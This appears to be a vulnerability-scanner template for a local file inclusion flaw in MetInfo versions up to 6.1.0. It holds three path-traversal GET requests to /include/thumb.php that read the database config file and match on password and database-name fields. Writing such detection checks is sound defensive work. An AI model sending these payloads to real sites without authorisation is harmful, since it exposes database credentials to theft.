id: metinfo-lfi
name: MetInfo <=6.1.0 - Local File Inclusion
severity: high
confidence: tentative
description: MetInfo 6.0.0 through 6.1.0 is vulnerable to local file inclusion and allows remote unauthenticated attackers
  access to locally stored files and their content.
reference: CWE-22
tags:
- metinfo
- lfi
- vuln
requests:
- method: GET
  path: /include/thumb.php?dir=http/.....///.....///config/config_db.php
  matchers: &id001
  - type: body
    words:
    - con_db_pass
    - con_db_name
  - type: status
    status:
    - 200
  condition: and
- method: GET
  path: /include/thumb.php?dir=.....///http/.....///config/config_db.php
  matchers: *id001
  condition: and
- method: GET
  path: /include/thumb.php?dir=http\\..\\..\\config\\config_db.php
  matchers: *id001
  condition: and
